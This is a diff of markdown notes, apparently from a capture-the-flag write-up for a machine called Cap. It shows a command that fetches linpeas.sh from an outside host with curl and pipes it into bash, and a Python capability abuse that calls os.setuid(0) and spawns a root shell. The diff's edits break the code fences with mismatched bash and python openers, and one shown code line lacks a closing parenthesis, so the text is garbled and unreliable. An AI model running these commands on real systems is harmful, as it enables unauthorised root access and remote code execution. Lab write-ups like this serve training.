@@ -13,14 +13,14 @@ Went on rabbit hole with this CVE from the enum script. CVE-2021-3560
 
 
 From our shell on Cap, we can fetch linpeas.sh with curl and pipe the output directly into bash to execute it:
-```
+```bash
 curl http://10.10.14.24/linpeas.sh | bash
 ```
-
+```python
 Open:
 ```
 nathan@cap:/tmp$ /usr/bin/python3.8
-```
+```bash
 import os
 os.setuid(0)
 os.system("/bin/bash"
@@ -31,11 +31,10 @@ os.system("/bin/bash"
 
 ```
 getcap /usr/bin/python3.8
-```
-
+```bash
+```python
 >This allows Python scripts to create raw sockets without requiring root privileges.​
-```
+```bash
 sudo setcap cap_net_raw+ep /usr/bin/python3
-```
-
+```bash
 
